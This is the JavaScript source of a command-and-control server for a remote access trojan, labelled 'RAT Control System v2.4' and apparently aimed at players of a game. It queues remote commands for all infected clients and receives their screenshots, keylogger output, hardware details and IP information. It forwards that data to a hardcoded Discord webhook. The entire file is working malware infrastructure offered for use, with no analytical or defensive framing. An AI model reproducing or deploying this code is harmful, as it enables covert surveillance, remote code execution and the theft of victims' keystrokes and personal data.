const http = require('http');
const fetch = require('node-fetch');

// Хранилище команд (для всех клиентов)
let commandQueue = [];
let lastScreenshot = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";

// Функция для отправки красивого сообщения в Discord
async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    const embed = {
        title: title,
        description: description,
        color: color,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: {
            text: "RAT Control System v2.4"
        }
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Ошибка отправки в Discord:', error);
    }
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { command, args } = JSON.parse(body);
                console.log(`📨 Получена команда: ${command}`);
                
                // Добавляем команду в очередь для ВСЕХ клиентов
                commandQueue.push({
                    command: command,
                    args: args || [],
                    timestamp: Date.now()
                });

                // Логирование в Discord
                if (command === "user_chat") {
                    await sendDiscordMessage(
                        "💬 Чат игрока",
                        `**${args[0]}:** ${args[1]}`,
                        0x3498db
                    );
                } else if (command === "execute_log") {
                    await sendDiscordMessage(
                        "🔧 Выполнение кода",
                        `**Игрок:** ${args[0]}\n**Результат:** ${args[1]}`,
                        0xf39c12
                    );
                } else if (command === "inject_notify") {
                    await sendDiscordMessage(
                        "🔌 Новый инжект!",
                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}`,
                        0x00ff00,
                        [
                            { name: "IP информация", value: args[2] || "N/A", inline: false }
                        ]
                    );
                }

                res.end(JSON.stringify({ 
                    status: "OK",
                    message: `Команда ${command} принята для всех клиентов`
                }));
            } catch (e) {
                console.error('Ошибка обработки команды:', e);
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid request", details: e.message }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/data') {
        console.log(`📡 Клиент запрашивает команды (в очереди: ${commandQueue.length})`);
        
        if (commandQueue.length > 0) {
            const commands = [...commandQueue]; // Отправляем ВСЕ команды
            commandQueue = []; // Очищаем очередь после отправки
            
            console.log(`📤 Отправка ${commands.length} команд клиенту`);
            
            // Если команд несколько, отправляем первую (клиент будет запрашивать следующие)
            const nextCommand = commands[0];
            
            res.end(JSON.stringify({
                command: nextCommand.command,
                args: nextCommand.args,
                timestamp: nextCommand.timestamp
            }));
        } else {
            // Нет команд
            res.end(JSON.stringify({
                command: "",
                args: []
            }));
        }
        return;
    }

    // Остальные endpoints остаются без изменений...
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                console.log('📸 Скриншот получен');
                res.end(JSON.stringify({ status: "Screenshot received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid screenshot data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/screenshot') {
        if (lastScreenshot) {
            res.end(JSON.stringify({ image: lastScreenshot }));
        } else {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "No screenshot available" }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                
                await sendDiscordMessage(
                    "⌨️ Данные кейлоггера",
                    `\`\`\`\n${logs.slice(0, 2000)}\n\`\`\``,
                    0xe74c3c,
                    [
                        { name: "Количество символов", value: logs.length.toString(), inline: true }
                    ]
                );
                
                res.end(JSON.stringify({ status: "Logs received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid keylog data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/hardware') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { player, data } = JSON.parse(body);
                
                await sendDiscordMessage(
                    "🖥️ Информация об оборудовании",
                    `**Игрок:** ${player}`,
                    0x9b59b6,
                    [
                        { name: "FPS", value: data.fps?.toString() || "N/A", inline: true },
                        { name: "Ping", value: data.ping?.toString() || "N/A", inline: true },
                        { name: "Executor", value: data.executor || "Unknown", inline: true },
                        { name: "CPU", value: data.cpu || "N/A", inline: true },
                        { name: "RAM", value: data.ram || "N/A", inline: true }
                    ]
                );
                
                res.end(JSON.stringify({ status: "Hardware data received" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid hardware data" }));
            }
        });
        return;
    }

    // Статус сервера
    if (req.method === 'GET' && req.url === '/status') {
        res.end(JSON.stringify({
            status: "online",
            version: "2.4.0",
            timestamp: new Date().toISOString(),
            pending_commands: commandQueue.length
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

server.listen(process.env.PORT || 3000, () => {
    console.log("🚀 Сервер запущен на порту 3000");
    console.log("📊 Версия: 2.4.0");
    console.log("🔗 Webhook: " + WEBHOOK_URL);
    console.log("✅ Готов к приему команд для всех клиентов");
});
